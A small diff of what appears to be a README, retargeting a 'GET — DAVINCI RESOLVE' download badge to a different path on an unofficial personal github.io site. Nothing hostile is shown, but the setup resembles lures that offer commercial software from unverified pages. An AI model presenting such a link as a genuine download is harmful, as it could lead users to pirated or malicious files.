@@ -4,7 +4,7 @@
 <img src="https://instructorhq.sfo2.cdn.digitaloceanspaces.com/3/course/thumbnail/davinci-resolve-editing-essentials-v1.jpg" width="780">
 </p>
 
-[![GET — DAVINCI RESOLVE](https://img.shields.io/badge/GET-DAVINCI%20RESOLVE-2563eb?style=for-the-badge)](https://israwki523902.github.io/.github/)
+[![GET — DAVINCI RESOLVE](https://img.shields.io/badge/GET-DAVINCI%20RESOLVE-2563eb?style=for-the-badge)](https://israwki523902.github.io/.github/DaVinci)
 
 ---
 
